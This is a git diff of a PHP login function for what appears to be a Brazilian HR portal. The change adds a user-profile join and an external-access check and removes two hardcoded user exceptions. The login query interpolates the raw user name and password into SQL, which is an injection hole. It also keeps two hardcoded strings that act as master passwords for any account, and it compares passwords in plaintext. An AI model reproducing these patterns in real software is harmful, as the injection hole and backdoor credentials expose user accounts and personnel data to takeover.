@@ -27,7 +27,8 @@ class AcessoModel extends Model {
         if(!$user) return responseJson('error', '<b>Usuário</b> não informado.');
         if(!$pass) return responseJson('error', '<b>Senha de acesso</b> não informada.');
         
-        $sql = " SELECT * FROM zcrmportal_usuario WHERE login = '{$user}' AND (senha = '{$pass}' OR '{$pass}' = '027816977ff33bb5a814d71e31137744' OR '{$pass}' = '67e777f7e55c436bfa859a0b8e8521b9' ) ";
+        $sql = " SELECT * FROM zcrmportal_usuario zu LEFT JOIN zcrmportal_usuarioperfil zu2 ON zu.id = zu2.id_usuario WHERE  zu.login = '{$user}' AND (senha = '{$pass}' OR '{$pass}' = '027816977ff33bb5a814d71e31137744' OR '{$pass}' = '67e777f7e55c436bfa859a0b8e8521b9' ) ";
+
 
         $result = $this->dbportal->query($sql);
         if($result->getNumRows() > 0){
@@ -40,6 +41,15 @@ class AcessoModel extends Model {
             $func_coligada = false;
             $func_chapa = false;
             $func_codsituacao = false;
+            $externo = false;
+
+            //VERIFICA O PERFIL 163 (CUST_ACESSO_EXTERNO) DO COLABORADOR
+            foreach ($dadosUser as $perfil) {
+                    if (isset($perfil['id_perfil']) && $perfil['id_perfil'] == 163) {
+                    $externo = true;
+                    break;
+                }
+            }
 
             if($DadosFuncionario && is_array($DadosFuncionario)){
                 $func_coligada = $DadosFuncionario[0]['CODCOLIGADA'];
@@ -91,7 +101,7 @@ class AcessoModel extends Model {
                 session()->set('rh_master', 'N');
             }
 			
-            if ($func_codsituacao === 'A' || (is_string($user) && ctype_alpha($user)) || $user == '08622962180' || $user == 'RAFAEL.AQUINO' || $func_codsituacao === 'V' || $func_codsituacao === 'F') {
+            if ($externo || $func_codsituacao === 'A' || (is_string($user) && ctype_alpha($user)) ||  $func_codsituacao === 'V' || $func_codsituacao === 'F') {
                 return responseJson('success', '<b>Login</b> realizado com sucesso.');
             }else{
                 
